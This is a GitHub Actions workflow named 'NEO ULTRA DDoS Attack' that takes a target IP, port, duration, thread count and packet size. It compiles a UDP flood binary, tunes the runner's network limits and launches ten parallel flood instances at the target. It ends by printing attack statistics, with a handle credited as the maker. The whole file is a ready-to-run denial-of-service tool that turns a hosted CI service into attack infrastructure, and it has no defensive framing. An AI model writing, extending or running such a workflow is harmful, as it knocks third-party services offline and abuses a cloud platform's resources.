name: 🚀 NEO ULTRA DDoS Attack

on:
  workflow_dispatch:
    inputs:
      target_ip:
        description: 'Target IP Address'
        required: true
        default: '192.168.1.1'
      target_port:
        description: 'Target Port'
        required: true 
        default: '80'
      attack_duration:
        description: 'Attack Duration (seconds)'
        required: true
        default: '60'
      attack_threads:
        description: 'Number of Threads'
        required: true
        default: '100000'
      packet_size:
        description: 'Packet Size (bytes)'
        required: true
        default: '512'

jobs:
  ultra_ddos:
    runs-on: ubuntu-latest
    timeout-minutes: 30
    
    steps:
    - name: 🛠️ Checkout Repository
      uses: actions/checkout@v4
      
    - name: 🔧 Setup Ultimate Environment
      run: |
        sudo apt-get update
        sudo apt-get install -y gcc make net-tools
        ulimit -n 999999
        ulimit -u 999999
        sysctl -w net.ipv4.tcp_max_syn_backlog=65536
        sysctl -w net.core.somaxconn=65536
        sysctl -w net.ipv4.ip_local_port_range="1024 65535"
        sysctl -w net.core.netdev_max_backlog=30000
        echo "⚡ ULTRA ENVIRONMENT OPTIMIZED FOR 100K+ THREADS"
        
    - name: 🚀 Compile NEO Ultra DDoS
      run: |
        echo "Compiling NEO Ultra DDoS binary..."
        gcc -pthread -O3 -o neo_udp_flood neo_udp_flood.c
        chmod +x neo_udp_flood
        echo "✅ Binary compiled successfully!"
        echo "👑 Made by: @NEOBLADE70"
        
    - name: 📊 System Information
      run: |
        echo "=== SYSTEM INFO ==="
        nproc
        free -h
        ulimit -a
        echo "==================="
        
    - name: 💥 LAUNCH NEO ULTRA ATTACK
      run: |
        echo "🎯 STARTING NEO ULTRA DDoS ATTACK"
        echo "======================================"
        echo "Target: ${{ github.event.inputs.target_ip }}:${{ github.event.inputs.target_port }}"
        echo "Duration: ${{ github.event.inputs.attack_duration }}s"
        echo "Threads: ${{ github.event.inputs.attack_threads }}"
        echo "Packet Size: ${{ github.event.inputs.packet_size }}"
        echo "Binary: neo_udp_flood"
        echo "Developer: @NEOBLADE70"
        echo "======================================"
        
        # Launch multiple instances for maximum power
        for i in {1..10}; do
          echo "🚀 Starting instance $i..."
          ./neo_udp_flood ${{ github.event.inputs.target_ip }} \
                          ${{ github.event.inputs.target_port }} \
                          ${{ github.event.inputs.attack_duration }} \
                          $(( ${{ github.event.inputs.attack_threads }} / 10 )) \
                          ${{ github.event.inputs.packet_size }} &
        done
        
        echo "⏳ Waiting for attack completion..."
        wait
        echo "✅ All attack instances completed!"
        
    - name: 📈 Attack Statistics
      if: always()
      run: |
        echo "📊 NEO ULTRA ATTACK COMPLETED"
        echo "================================"
        echo "🎯 Target: ${{ github.event.inputs.target_ip }}:${{ github.event.inputs.target_port }}"
        echo "⏰ Duration: ${{ github.event.inputs.attack_duration }} seconds"
        echo "🧵 Threads: ${{ github.event.inputs.attack_threads }}"
        echo "📦 Packet Size: ${{ github.event.inputs.packet_size }} bytes"
        echo "💥 Attack Type: UDP Flood"
        echo "🛠️ Binary: neo_udp_flood"
        echo "👑 Made by: @NEOBLADE70"
        echo "🚀 Power Level: MAXIMUM"
        echo "✅ GitHub Actions: FULLY UTILIZED"
        echo "================================"